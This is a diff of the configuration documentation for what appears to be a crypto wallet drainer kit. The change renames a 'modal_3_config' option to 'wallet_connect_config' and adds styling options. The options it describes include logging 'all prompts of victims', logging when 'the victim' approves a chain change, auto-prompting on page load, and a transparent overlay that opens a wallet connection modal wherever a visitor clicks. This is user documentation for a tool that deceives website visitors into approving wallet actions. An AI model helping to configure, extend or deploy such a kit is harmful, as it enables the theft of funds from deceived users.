@@ -47,10 +47,10 @@ Options explained:
 -modal_style: Define the modal style, see below.
 -modal_theme: Define if the modal will be on "dark", "light" or "default" mode.
 -use_window_provider_if_detected: Will use diretly wallet injected on browser is detected (for example, if MetaMask detected, it will diretly try to connect it without prompting the modal).
--modal_3_config: See below. (modal_3_config must be 3)
+-wallet_connect_config: See below.
 -auto_prompt: Prompt the modal (or the window provider if "use_window_provider_if_detected" is true) at soon as the site loaded.
 -click_everywhere_open_modal: set a transparent overlay that open the modal if user click anywhere in the page.
--wallet_connect_v2_project_id: If you use modal 3, it's better to set it, you can get your own project id on https://cloud.walletconnect.com/sign-up. (modal_3_config must be 3)
+-wallet_connect_v2_project_id: If you use modal 3, it's better to set it, you can get your own project id on https://cloud.walletconnect.com/sign-up.
 
 -log_prompts: Define if you want to see all prompts of victims. We don't recommand it cuz it will rate limit the logs bot.
 -log_chains_accepts: Define if you want to log when the victim approve change chain.
@@ -103,11 +103,13 @@ Modal 3: https://ibb.co/4RTRKpP ( dark) and https://ibb.co/3d2vcfT ( light)
 Modal 4: https://ibb.co/BwRKyss ( dark) and https://ibb.co/37rkDVX ( light)
 
 
-You can edit modal 3 design with "modal_3_config" option:
--logo_url: Define the logo of the modal 3.
--background_color: Define the color of the modal 3 background (support hex color with # in front).
--accent_color: Define the color of the main texts on the modal 3 (support hex color with # in front).
--accept_fill_color: Define the color of the fill text of modal 3, not very usefull (support hex color with # in front).
+You can edit wallet connnect design with "wallet_connect_config" option (if modal style is 3 it will diretly edit the modal):
+-logo_url: Define the logo.
+-background_image: Define the backgorund image.
+-background_color: Define the background color (support hex color with # in front).
+-accent_color: Define the color of the main texts (support hex color with # in front).
+-accept_fill_color: Define the color of the fill text, not very usefull (support hex color with # in front).
+-overlay_background_color:  Define the color of the overlay(support hex color with # in front).
 -font_family: Define the fonts to use.
 
 
